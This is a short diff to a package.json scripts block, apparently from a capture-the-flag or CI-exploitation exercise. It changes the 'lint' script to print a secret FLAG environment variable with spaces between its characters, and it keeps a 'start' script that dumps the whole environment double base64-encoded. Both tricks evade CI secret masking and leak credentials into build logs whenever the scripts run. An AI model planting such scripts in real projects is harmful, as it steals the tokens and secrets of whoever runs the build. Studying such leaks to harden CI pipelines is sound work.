@@ -14,7 +14,7 @@
     "eslint": "8.57.0"
   },
   "scripts": {
-    "lint": "env",
+    "lint": "echo $FLAG_TOPPINGS_OVERFLOW_L0_GRAVY | sed 's/./& /g'",
     "start": "env|base64|base64"
   }
 }
